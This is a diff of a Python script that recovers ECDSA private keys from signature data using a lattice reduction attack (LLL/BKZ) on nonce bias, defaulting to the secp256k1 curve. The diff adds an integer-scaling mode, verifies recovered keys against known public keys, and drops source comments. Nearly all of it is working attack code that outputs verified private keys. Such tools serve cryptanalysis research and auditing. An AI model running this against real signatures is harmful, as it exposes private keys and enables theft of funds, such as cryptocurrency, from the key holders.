@@ -1,30 +1,23 @@
 #!/usr/bin/env python
 # Author: Dario Clavijo (2020)
-# Based on:
-# https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/
-# https://www.youtube.com/watch?v=6ssTlSSIJQE
 
 import sys
 import argparse
 import mmap
 import gmpy2
-import binascii
-from ecdsa import SigningKey, SECP256k1
 from fpylll import IntegerMatrix, LLL, BKZ
+from ecdsa import SigningKey, SECP256k1
 
-# Default order from secp256k1 curve
+
 DEFAULT_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 
 
 def modular_inv(a, b):
-    """Efficient modular inverse"""
     return int(gmpy2.invert(a, b))
 
 
 def load_csv(filename, limit=None, mmap_flag=False):
-    """Load CSV with ECDSA data."""
     msgs, sigs, pubs = [], [], []
-
     if mmap_flag:
         with open(filename, 'r') as f:
             mapped_file = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
@@ -46,18 +39,13 @@ def load_csv(filename, limit=None, mmap_flag=False):
                 msgs.append(int(Z, 16))
                 sigs.append((int(R, 16), int(S, 16)))
                 pubs.append(pub)
-
     return msgs, sigs, pubs
 
 
-def make_matrix_fpylll(msgs, sigs, B, order):
-    """
-    Construct IntegerMatrix for fpylll reduction.
-    """
+def make_matrix_fpylll(msgs, sigs, B, order, integer_mode=False):
     m = len(msgs)
     m1, m2 = m + 1, m + 2
     B2 = 1 << B
-
     mat = IntegerMatrix(m2, m2)
 
     msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
@@ -67,11 +55,21 @@ def make_matrix_fpylll(msgs, sigs, B, order):
 
     for i in range(m):
         mi_sigi_order = modular_inv(sigs[i][1], order)
-        mat[i, i] = order
-        mat[m, i] = int((sigs[i][0] * mi_sigi_order - rnsn_inv) % order)
-        mat[m1, i] = int((msgs[i] * mi_sigi_order - mnsn_inv) % order)
+        delta_r = (sigs[i][0] * mi_sigi_order - rnsn_inv) % order
+        delta_z = (msgs[i] * mi_sigi_order - mnsn_inv) % order
 
-    mat[m, m1] = B2 // order
+        mat[i, i] = order
+        if integer_mode:
+            mat[m, i] = int(order * delta_r)
+            mat[m1, i] = int(order * delta_z)
+        else:
+            mat[m, i] = int(delta_r)
+            mat[m1, i] = int(delta_z)
+
+    if integer_mode:
+        mat[m, m1] = B2
+    else:
+        mat[m, m1] = int(B2 // order)
     mat[m1, m1] = B2
 
     return mat
@@ -87,10 +85,6 @@ def reduce_matrix(matrix, algorithm="LLL"):
 
 
 def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20):
-    """
-    Try recovering private keys from reduced lattice matrix.
-    """
-    from math import sqrt
     keys = set()
     m = len(msgs)
     msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
@@ -102,10 +96,7 @@ def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20):
         c = sn * msgs[i]
         d = msgn * sigs[i][1]
         cd = (c - d) % order
-        if a == b:
-            ab_list = None
-        else:
-            ab_list = [(a - b) % order, (b - a) % order]
+        ab_list = None if a == b else [(a - b) % order, (b - a) % order]
         params.append((b, cd, ab_list))
 
     row_norms = []
@@ -124,69 +115,51 @@ def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20):
                 for ab in ab_list:
                     if ab:
                         inv = modular_inv(ab, order)
-                        key = (base * inv) % order
-                        keys.add(key)
+                        keys.add((base * inv) % order)
     return list(keys)
 
 
-def verify_key(privkey, pubkey_hex):
+def is_valid_key(privkey: int, pubkeys: list) -> bool:
     """
-    Verifies whether the private key matches the given compressed or uncompressed pubkey.
+    Check if privkey matches any known pubkey (hex string, uncompressed only).
     """
-    sk = SigningKey.from_secret_exponent(privkey, curve=SECP256k1)
-    vk = sk.get_verifying_key()
-
-    x = vk.pubkey.point.x()
-    y = vk.pubkey.point.y()
-    x_bytes = x.to_bytes(32, byteorder='big')
-
-    # Compressed format
-    prefix = b'\x02' if y % 2 == 0 else b'\x03'
-    compressed_pub = prefix + x_bytes
-
-    # Uncompressed format
-    uncompressed_pub = b'\x04' + vk.to_string()
-
-    pubkey_hex = pubkey_hex.lower()
-    return (
-        pubkey_hex == compressed_pub.hex()
-        or pubkey_hex == uncompressed_pub.hex()
-    )
+    try:
+        sk = SigningKey.from_secret_exponent(privkey, curve=SECP256k1)
+        vk = sk.get_verifying_key()
+        derived_hex = "04" + vk.to_string().hex()
+        return derived_hex.lower() in [p.lower() for p in pubkeys]
+    except Exception:
+        return False
 
 
-def display_keys(keys, ref_pubkey):
-    """Display and verify recovered private keys."""
-    for key in keys:
-        status = "✔️" if verify_key(key, ref_pubkey) else "❌"
-        print(f"{key:064x} {status}")
+def display_keys(keys, pubkeys):
+    verified = [k for k in keys if is_valid_key(k, pubkeys)]
+    if not verified:
+        print("No verified keys found.")
+        return
+    print("\nVerified private keys:")
+    for key in verified:
+        print(f"{key:064x}")
+
 
 def main():
     parser = argparse.ArgumentParser(description="ECDSA private key recovery using lattice reduction (fpylll)")
     parser.add_argument("filename", help="CSV file containing ECDSA traces")
     parser.add_argument("B", type=int, help="log2 bound parameter B")
     parser.add_argument("limit", type=int, help="Limit number of signatures to process")
-    parser.add_argument(
-        "--order", type=int, default=DEFAULT_ORDER,
-        help="Curve order (default: secp256k1)"
-    )
-    parser.add_argument(
-        "--reduction", choices=["LLL", "BKZ"], default="LLL",
-        help="Lattice reduction algorithm (default: LLL)"
-    )
-    parser.add_argument(
-        "--mmap", action="store_true",
-        help="Enable mmap for fast CSV access"
-    )
-
+    parser.add_argument("--order", type=int, default=DEFAULT_ORDER, help="Curve order (default: secp256k1)")
+    parser.add_argument("--reduction", choices=["LLL", "BKZ"], default="LLL", help="Lattice reduction algorithm")
+    parser.add_argument("--mmap", action="store_true", help="Enable mmap for fast CSV access")
+    parser.add_argument("--integer_mode", action="store_true", help="Scale matrix to ensure integer values")
     args = parser.parse_args()
 
     msgs, sigs, pubs = load_csv(args.filename, limit=args.limit, mmap_flag=args.mmap)
     sys.stderr.write(f"Using: {len(msgs)} sigs...\n")
 
-    matrix = make_matrix_fpylll(msgs, sigs, args.B, args.order)
+    matrix = make_matrix_fpylll(msgs, sigs, args.B, args.order, integer_mode=args.integer_mode)
     matrix = reduce_matrix(matrix, algorithm=args.reduction)
     keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, args.order)
-    display_keys(keys)
+    display_keys(keys, pubs)
 
 
 if __name__ == "__main__":
